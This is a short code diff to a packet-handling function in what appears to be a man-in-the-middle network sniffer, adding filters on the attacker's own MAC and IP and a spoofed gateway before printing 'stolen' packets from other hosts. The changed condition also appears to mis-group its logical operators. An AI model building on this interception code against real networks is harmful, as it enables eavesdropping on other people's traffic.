@@ -131,8 +131,15 @@ void process_ip(ipv4_eth* packet,int len){
 	
 	//std::cout<<"!"<<std::string(packet->src)<<" -> "<<std::string(packet->dst)<<" : "<<len<<"bytes\n";
 	
-	if(ip_to_mac.find(packet->sip.word)==ip_to_mac.end()
-		&&ip_to_mac.find(packet->tip.word)==ip_to_mac.end())
+	if(!memcmp(&packet->src,&my_mac,6))
+		return;
+	
+	if(packet->sip.word==my_ip.word
+		||packet->tip.word==my_ip.word)
+			return;
+	
+	if((ip_to_mac.find(packet->sip.word)==ip_to_mac.end() || packet->sip.word==real_gateway.word)
+		&&ip_to_mac.find(packet->tip.word)==ip_to_mac.end() || packet->tip.word==real_gateway.word)
 			return;
 	
 	pthread_mutex_lock(&stdoutmutex); // display stolen packet..or we can just use wireshark
